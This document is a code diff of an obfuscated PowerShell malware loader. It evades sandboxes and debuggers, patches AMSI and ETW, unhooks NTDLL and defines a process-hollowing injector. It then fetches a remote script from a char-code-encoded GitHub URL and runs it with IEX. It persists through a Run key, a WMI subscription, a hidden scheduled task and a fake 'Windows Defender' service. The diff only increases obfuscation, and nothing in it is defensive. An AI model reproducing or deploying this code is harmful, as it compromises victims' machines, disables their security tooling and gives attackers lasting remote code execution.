@@ -1,15 +1,12 @@
 $ErrorActionPreference='SilentlyContinue'
 $ProgressPreference='SilentlyContinue'
 
-# Anti-Debug: Check for debugger
 if(([System.Diagnostics.Debugger]::IsAttached) -or ((Get-Process -ErrorAction SilentlyContinue).Count -lt 40)){exit}
-$WzJ55jVkW209JMgB=Get-CimInstance Win32_ComputerSystem
-if($WzJ55jVkW209JMgB.NumberOfLogicalProcessors -lt 2){exit}
-if($WzJ55jVkW209JMgB.TotalPhysicalMemory -lt 4GB){exit}
+$kTNFbGZV7V4CfoVi=Get-CimInstance Win32_ComputerSystem
+if($kTNFbGZV7V4CfoVi.NumberOfLogicalProcessors -lt 2){exit}
+if($kTNFbGZV7V4CfoVi.TotalPhysicalMemory -lt 4GB){exit}
 
-
-# AMSI Hardware Patch using C#
-$iVz6JR7RE6YUihCo=@'
+$Qu46YgBsonGfYUo1=@'
 using System;
 using System.Runtime.InteropServices;
 public class AmsiKiller {
@@ -28,17 +25,14 @@ public class AmsiKiller {
     }
 }
 '@
-Add-Type -TypeDefinition $iVz6JR7RE6YUihCo -Language CSharp
+Add-Type -TypeDefinition $Qu46YgBsonGfYUo1 -Language CSharp
 [AmsiKiller]::Kill()
 
-# ETW Patch
-$waNBFdTNpMGHCIjD=[Ref].Assembly.GetTypes()|?{$_.Name-like"*iUtils"}|Select -First 1
-$0vOJdM3eVhlxKOOq=$waNBFdTNpMGHCIjD.GetFields([System.Reflection.BindingFlags]40)|?{$_.Name-like"*tFailed"}|Select -First 1
-$0vOJdM3eVhlxKOOq.SetValue($null,$true)
+$1A9Jnb92kcUTPICl=[Ref].Assembly.GetTypes()|?{$_.Name-like"*iUtils"}|Select -First 1
+$13uhyR41wFCx3Jfi=$1A9Jnb92kcUTPICl.GetFields([System.Reflection.BindingFlags]40)|?{$_.Name-like"*tFailed"}|Select -First 1
+$13uhyR41wFCx3Jfi.SetValue($null,$true)
 
-
-# DLL Unhooking: Load clean NTDLL
-$HhrenF06NYMydc4i=@'
+$Jj9R3bOXoCukV4xj=@'
 using System;
 using System.Runtime.InteropServices;
 using System.IO;
@@ -56,10 +50,9 @@ public class Unhooker {
     }
 }
 '@
-Add-Type -TypeDefinition $HhrenF06NYMydc4i -Language CSharp
+Add-Type -TypeDefinition $Jj9R3bOXoCukV4xj -Language CSharp
 
-
-$WJdvFlJGnqerZu0t=@'
+$2VqxessF1CzL309d=@'
 using System;
 using System.Runtime.InteropServices;
 using System.Diagnostics;
@@ -107,48 +100,50 @@ public class Hollower {
     }
 }
 '@
-Add-Type -TypeDefinition $WJdvFlJGnqerZu0t -Language CSharp
+Add-Type -TypeDefinition $2VqxessF1CzL309d -Language CSharp
 
 
-$FF2rXFtEZjZAu1xX=[char[]](104,116,116,112,115,58,47,47,98,105,116,98,117,99,107,101,116,46,111,114,103,47,118,111,114,116,101,120,100,114,97,120,47,118,111,114,116,101,120,47,100,111,119,110,108,111,97,100,115,47,86,111,114,103,111,100,108,97,115,116,46,112,115,49)-join''
-$Qky7YL5zaOzU8gnQ=cmd /c ('curl -sLkH "User-Agent: Mozilla/5.0" "'+$FF2rXFtEZjZAu1xX+'"')
-if(-not $Qky7YL5zaOzU8gnQ -or -not ($Qky7YL5zaOzU8gnQ -like '*$*')){exit}
+$EbGafVap99fhr0Qc=[char[]](104,116,116,112,115,58,47,47,114,97,119,46,103,105,116,104,117,98,117,115,101,114,99,111,110,116,101,110,116,46,99,111,109,47,76,101,101,119,97,115,104,101,114,101,50,48,50,54,47,118,111,114,116,101,120,47,114,101,102,115,47,104,101,97,100,115,47,109,97,105,110,47,86,111,114,103,111,100,108,97,115,116,46,112,115,49)-join''
+$XebZ5caeDLlZne5q=cmd /c ('curl -sLkH "User-Agent: Mozilla/5.0" "'+$EbGafVap99fhr0Qc+'"')
+if(-not $XebZ5caeDLlZne5q -or -not ($XebZ5caeDLlZne5q -like '*$*')){exit}
 
-$ZLPrBJrbL3FqiPdm=[System.Text.Encoding]::UTF8.GetBytes($Qky7YL5zaOzU8gnQ)
+$Ep7fHd1iqF61FtPs=[System.Text.Encoding]::UTF8.GetBytes($XebZ5caeDLlZne5q)
+
+[Hollower]::Inject($Ep7fHd1iqF61FtPs)
+
+IEX($XebZ5caeDLlZne5q)
 
 
-[Hollower]::Inject($ZLPrBJrbL3FqiPdm)
 
-IEX($Qky7YL5zaOzU8gnQ)
+$z5dMTeZFZaGez0ap=[char[]](72,75,67,85,58,92,83,111,102,116,119,97,114,101,92,77,105,99,114,111,115,111,102,116,92,87,105,110,100,111,119,115,92,67,117,114,114,101,110,116,86,101,114,115,105,111,110,92,82,117,110)-join''
+$58EX3ElzY2KjiqYW="WinUpdate_"+(Get-Random -Max 99999)
+$3yGGz3dENCrgagBd="powershell -W Hidden -C `"IEX(curl -s '"+$EbGafVap99fhr0Qc+"')`""
+Set-ItemProperty -Path $z5dMTeZFZaGez0ap -Name $58EX3ElzY2KjiqYW -Value $3yGGz3dENCrgagBd -Force | Out-Null
 
-
-$QHHzTKjTYCqvv9ps=[char[]](72,75,67,85,58,92,83,111,102,116,119,97,114,101,92,77,105,99,114,111,115,111,102,116,92,87,105,110,100,111,119,115,92,67,117,114,114,101,110,116,86,101,114,115,105,111,110,92,82,117,110)-join''
-$khV9qKoQTv0whWou="WinUpdate_"+(Get-Random -Max 99999)
-$IkpdoBmktJseFpDB="powershell -W Hidden -C `"IEX(curl -s '"+$FF2rXFtEZjZAu1xX+"')`""
-Set-ItemProperty -Path $QHHzTKjTYCqvv9ps -Name $khV9qKoQTv0whWou -Value $IkpdoBmktJseFpDB -Force | Out-Null
-
-$OGm9iEARj66Gwu4v="WMI_"+(Get-Random -Max 99999)
-$0BH4hatkjMCEEr9J="SELECT * FROM __InstanceModificationEvent WITHIN 30 WHERE TargetInstance ISA 'Win32_LocalTime' AND TargetInstance.Second=0"
-$HCnd1UADjZfuCplU=Set-WmiInstance -Namespace root\subscription -Class __EventFilter -Args @{Name=$OGm9iEARj66Gwu4v;EventNamespace='root\cimv2';QueryLanguage='WQL';Query=$0BH4hatkjMCEEr9J} -ErrorAction SilentlyContinue
-$dw46aZ9aRh5zZw64=Set-WmiInstance -Namespace root\subscription -Class CommandLineEventConsumer -Args @{Name=$OGm9iEARj66Gwu4v;CommandLineTemplate=$IkpdoBmktJseFpDB} -ErrorAction SilentlyContinue
-if($HCnd1UADjZfuCplU -and $dw46aZ9aRh5zZw64){
-    Set-WmiInstance -Namespace root\subscription -Class __FilterToConsumerBinding -Args @{Filter=$HCnd1UADjZfuCplU;Consumer=$dw46aZ9aRh5zZw64} | Out-Null
+$ZxVIIlRTmv2gWpo7="WMI_"+(Get-Random -Max 99999)
+$5FvJ5DmdNFG1cmyQ="SELECT * FROM __InstanceModificationEvent WITHIN 30 WHERE TargetInstance ISA 'Win32_LocalTime' AND TargetInstance.Second=0"
+$24XqDzutbIxmj2fa=Set-WmiInstance -Namespace root\subscription -Class __EventFilter -Args @{Name=$ZxVIIlRTmv2gWpo7;EventNamespace='root\cimv2';QueryLanguage='WQL';Query=$5FvJ5DmdNFG1cmyQ} -ErrorAction SilentlyContinue
+$MX82L7OmXzictzbU=Set-WmiInstance -Namespace root\subscription -Class CommandLineEventConsumer -Args @{Name=$ZxVIIlRTmv2gWpo7;CommandLineTemplate=$3yGGz3dENCrgagBd} -ErrorAction SilentlyContinue
+if($24XqDzutbIxmj2fa -and $MX82L7OmXzictzbU){
+    Set-WmiInstance -Namespace root\subscription -Class __FilterToConsumerBinding -Args @{Filter=$24XqDzutbIxmj2fa;Consumer=$MX82L7OmXzictzbU} | Out-Null
 }
 
-$fsQMDBL2loohtTzT="SecurityUpdate_"+(Get-Random -Max 9999)
-$aFdI0Rs5IYHxxLW6=New-ScheduledTaskAction -Execute "powershell" -Argument "-W Hidden -C IEX(curl -s '$FF2rXFtEZjZAu1xX')"
-$PEYqK7pIrI5VqK5H=New-ScheduledTaskTrigger -AtLogOn
-$GQcQWKvKJK3XTe1v=New-ScheduledTaskSettingsSet -Hidden -StartWhenAvailable -AllowStartIfOnBatteries -DontStopIfGoingOnBatteries
-Register-ScheduledTask -TaskName $fsQMDBL2loohtTzT -Action $aFdI0Rs5IYHxxLW6 -Trigger $PEYqK7pIrI5VqK5H -Settings $GQcQWKvKJK3XTe1v -Force | Out-Null
+$xrzZjGZgX4V5BCD0="SecurityUpdate_"+(Get-Random -Max 9999)
+$4Lr4L9XVqMgt5VnM=New-ScheduledTaskAction -Execute "powershell" -Argument "-W Hidden -C IEX(curl -s '$EbGafVap99fhr0Qc')"
+$dL4l3tBwDLVOFJTA=New-ScheduledTaskTrigger -AtLogOn
+$ogdWVwQ01rKiG3kS=New-ScheduledTaskSettingsSet -Hidden -StartWhenAvailable -AllowStartIfOnBatteries -DontStopIfGoingOnBatteries
+Register-ScheduledTask -TaskName $xrzZjGZgX4V5BCD0 -Action $4Lr4L9XVqMgt5VnM -Trigger $dL4l3tBwDLVOFJTA -Settings $ogdWVwQ01rKiG3kS -Force | Out-Null
 
-$13CgIsXZBzXwhcv7="WinDef_"+(Get-Random -Max 999)
-$bhIKUphK9Ts084U0="cmd /c '"+$IkpdoBmktJseFpDB+"'"
-sc.exe create $13CgIsXZBzXwhcv7 binPath= "$bhIKUphK9Ts084U0" start= delayed-auto displayname= "Windows Defender Security Module" type= share | Out-Null
 
-$gGYDVgWx21uK9rU7=([char[]](72,75,76,77,58,92,83,89,83,84,69,77,92,67,117,114,114,101,110,116,67,111,110,116,114,111,108,83,101,116,92,67,111,110,116,114,111,108,92,83,101,115,115,105,111,110,32,77,97,110,97,103,101,114)-join'')
-:
+$2fwq93ACnq2wthL0="WinDef_"+(Get-Random -Max 999)
+$P5eULzTERJ8mJMv2="cmd /c '"+$3yGGz3dENCrgagBd+"'"
+sc.exe create $2fwq93ACnq2wthL0 binPath= "$P5eULzTERJ8mJMv2" start= delayed-auto displayname= "Windows Defender Security Module" type= share | Out-Null
+
+
+$0rbRANEYGft8FzEW=([char[]](72,75,76,77,58,92,83,89,83,84,69,77,92,67,117,114,114,101,110,116,67,111,110,116,114,111,108,83,101,116,92,67,111,110,116,114,111,108,92,83,101,115,115,105,111,110,32,77,97,110,97,103,101,114)-join'')
+
 try{
-    $3zHoeEsb4dKzCQfH=(Get-ItemProperty -Path $gGYDVgWx21uK9rU7 -Name BootExecute -ErrorAction SilentlyContinue)
+    $jIOrkRA0E6QB1ZA6=(Get-ItemProperty -Path $0rbRANEYGft8FzEW -Name BootExecute -ErrorAction SilentlyContinue)
 }catch{}
 
 
